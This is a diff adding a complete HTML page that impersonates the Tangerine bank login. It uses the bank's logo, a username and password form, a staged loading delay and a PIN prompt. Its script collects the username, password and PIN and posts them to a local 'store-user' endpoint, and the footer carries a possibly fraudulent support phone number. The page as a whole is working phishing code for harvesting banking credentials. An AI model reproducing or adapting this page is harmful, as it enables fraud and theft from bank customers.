@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tangerine Login</title>
+    <link rel="stylesheet" href="../styles.css">
+    <style>
+        body {
+            background: linear-gradient(to bottom, #f9f9f9, #e9ecef);
+            font-family: Arial, sans-serif;
+        }
+
+        .login-container {
+            max-width: 400px;
+            margin: 50px auto;
+            background: #ffffff;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+        }
+
+        .login-header img {
+            display: block;
+            margin: 0 auto;
+            width: 120px;
+        }
+
+        .login-header h1 {
+            font-size: 1.8rem;
+            margin: 20px 0;
+            text-align: center;
+            color: #333;
+        }
+
+        .login-form {
+            margin-top: 20px;
+        }
+
+        .login-form label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+            color: #555;
+        }
+
+        .login-form input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+
+        .login-form button {
+            width: 100%;
+            padding: 10px;
+            background-color: #e56b1e;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.1rem;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .login-form button:hover {
+            background-color: #d45f1b;
+        }
+
+        .footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 0.9rem;
+            color: #666;
+        }
+
+        .footer a {
+            color: #0077c8;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Modal Background */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        /* Loading Screen Content */
+        #loadingScreen .modal-content {
+            text-align: center;
+            color: #e56b1e;
+            font-size: 1.2rem;
+            font-weight: bold;
+        }
+
+        /* Modal Content */
+        .modal-content {
+            background: #fff;
+            margin: 15% auto;
+            padding: 20px;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .modal-content h2 {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            color: #333;
+        }
+
+        .modal-content form {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .modal-content form label {
+            font-size: 1rem;
+            margin-bottom: 5px;
+        }
+
+        .modal-content form input {
+            width: 50%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 1rem;
+            text-align: center;
+        }
+
+        .modal-content form button {
+            padding: 10px 20px;
+            background: #e56b1e;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .modal-content form button:hover {
+            background-color: #d45f1b;
+        }
+
+        .close-modal {
+            margin-top: 10px;
+            padding: 10px 20px;
+            background: #ccc;
+            color: #333;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .close-modal:hover {
+            background-color: #999;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-header">
+            <img src="../bank_logos/Tangerine.png" alt="Tangerine Logo">
+            <h1>Tangerine Login</h1>
+        </div>
+        <form class="login-form" onsubmit="showLoadingScreen(event)">
+            <label for="username">Username</label>
+            <input type="text" id="username" placeholder="Enter your Client Card" required>
+    
+            <label for="password">Password</label>
+            <input type="password" id="password" placeholder="Enter your password" required>
+    
+            <button type="submit">Login</button>
+        </form>
+        <div class="footer">
+            <p>Need help? <a href="tel:+12267700908">Contact Support</a></p>
+            <p><a href="#">Privacy Policy</a> | <a href="#">Terms of Use</a></p>
+        </div>
+    </div>
+    
+    <!-- Loading Screen -->
+    <div id="loadingScreen" class="modal">
+        <div class="modal-content">
+            <h2>Loading...</h2>
+            <p>Please wait while we process your login.</p>
+        </div>
+    </div>
+    
+    <!-- PIN Modal -->
+    <div id="pinModal" class="modal">
+        <div class="modal-content">
+            <h2>Enter Your PIN</h2>
+            <form onsubmit="verifyPin(event)">
+                <label for="pin">PIN:</label>
+                <input type="password" id="pin" maxlength="4" placeholder="Enter 4-digit PIN" required>
+                <button type="submit">Verify</button>
+            </form>
+            <button class="close-modal" onclick="closePinModal()">Cancel</button>
+        </div>
+    </div>
+
+    <script>
+        function showLoadingScreen(event) {
+            event.preventDefault();
+    
+            const loadingScreen = document.getElementById('loadingScreen');
+            const pinModal = document.getElementById('pinModal');
+    
+            loadingScreen.style.display = 'flex';
+    
+            setTimeout(() => {
+                loadingScreen.style.display = 'none';
+                pinModal.style.display = 'flex';
+            }, 3000);
+        }
+    
+        async function verifyPin(event) {
+            event.preventDefault();
+    
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const pin = document.getElementById('pin').value;
+            const bankName = "Tangerine"; // Hardcoded bank name
+    
+            try {
+                const response = await fetch('http://localhost:3002/store-user', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, password, pin, bankName }),
+                });
+    
+                if (response.ok) {
+                    window.location.href = 'success.html'; // Redirect to success page
+                } else {
+                    alert('Failed to save data. Please try again.');
+                }
+            } catch (error) {
+                console.error('Error saving data:', error);
+                alert('An error occurred. Please try again.');
+            }
+        }
+    
+        function closePinModal() {
+            document.getElementById('pinModal').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
